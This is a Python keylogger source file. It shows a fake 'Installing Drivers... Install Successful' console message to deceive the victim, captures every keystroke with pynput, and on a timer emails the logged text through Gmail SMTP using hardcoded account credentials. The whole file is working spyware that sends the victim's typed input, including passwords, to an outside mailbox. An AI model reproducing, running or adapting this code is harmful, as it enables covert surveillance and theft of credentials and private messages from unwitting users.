from pynput.keyboard import Listener
import smtplib
from threading import Timer
import time
import os
 
os.system("start /wait cmd /c ECHO Installing Drivers... & ping 127.0.0.1 -n 5 > nul & ECHO Drivers Installed & ECHO Installing Software & ping 127.0.0.1 -n 5 > nul & ECHO Installed & ECHO Install Successful... Exiting & ping 127.0.0.1 -n 3 > nul") 


msg = ''
 
def on_press(key):
    global msg
    k = str(key).replace("'", "")
     
    if k == 'Key.enter':
        msg += "[ENTER]\n"
    elif k == 'Key.backspace':
        msg = msg[:-1] 
    elif k == 'Key.shift':
        msg += ''
    elif k == 'Key.delete':
        msg += '[DEL]'
    elif k == 'Key.space':
        msg += ' '
    elif k == 'Key.ctrl':
        msg += 'CTRL+'
    else:
        msg += k
 
def write():
    global msg
    if len(msg)>0:
        #f = open("output.txt", "a")
        #f.write(msg)
        #f.close()
        
        #Email
        EMAIL_ADDRESS = "rogerdaltrey69@gmail.com"
        EMAIL_PASSWORD = "P@$$word1!"
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
        server.quit()
    msg = ""
 
#keyboard listening
listener = Listener(on_press=on_press)
listener.start()
 
#Loop to logger every 10 seconds
#Output will log key string every 10 seconds
while(0 == 0):
    time.sleep(30)
    Timer(30.0, write).start()
    